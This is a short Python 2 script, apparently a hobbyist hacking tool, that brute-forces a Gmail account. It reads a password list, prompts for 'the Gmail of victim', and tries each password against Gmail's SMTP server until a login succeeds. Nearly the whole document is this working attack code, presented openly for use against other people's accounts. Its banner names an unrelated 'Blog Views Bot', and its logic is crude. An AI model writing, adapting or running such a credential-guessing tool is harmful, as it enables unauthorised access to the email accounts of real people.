import smtplib
from os import system

print """Mahmoud Hany Security      _____ ___  ____            ____  _              __     ___                     ____        _                                                     
    |  ___/ _ \/ ___|          | __ )| | ___   __ _  \ \   / (_) _____      _____  | __ )  ___ | |_                                                   
    | |_ | | | \___ \   _____  |  _ \| |/ _ \ / _` |  \ \ / /| |/ _ \ \ /\ / / __| |  _ \ / _ \| __|                                                  
    |  _|| |_| |___) | |_____| | |_) | | (_) | (_| |   \ V / | |  __/\ V  V /\__ \ | |_) | (_) | |_                                                   
    |_|   \___/|____/          |____/|_|\___/ \__, |    \_/  |_|\___| \_/\_/ |___/ |____/ \___/ \__|                                                  
"""
print """Thise Script Maded By Abo Hany 1 Pas Hhhhh""" 
print """Thise Script Maded By Abo Hany 1 Pas Hhhhh""" 
print """Thise Script Maded By Abo Hany 1 Pas Hhhhh""" 
print """Thise Script Maded By Abo Hany 1 Pas Hhhhh""" 
print """Thise Script Maded By Abo Hany 1 Pas Hhhhh""" 

print """      My Acount https://www.facebook.com/mahmoudhanyhack   """

print '[1] Start BrutForces Attackes'
print '[2] Exit'
option = input('==>')
if option == 1:
   file_path = raw_input('Patch The Password Text ^_^ :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input("Enter The Gmail Of Victim ^_^ : ")
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         
         print '\n'
         print 'Lol Password Found ^_^, password :) ' + password 
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            
            print 'Lol Password Found ^_^ , password :) ' + password 

            break
         else:
            print 'password Un Correct Oooooo No :( =>: ' + password
login()


print """   :( If Password Not Found On The Text :(       :( Try Another Password List :(           """

print """                   Coded By Mahmoud Hany Security ^_^        """

print """                                                                                                """

print """                 My Acount https://www.facebook.com/mahmoudhanyhack    """
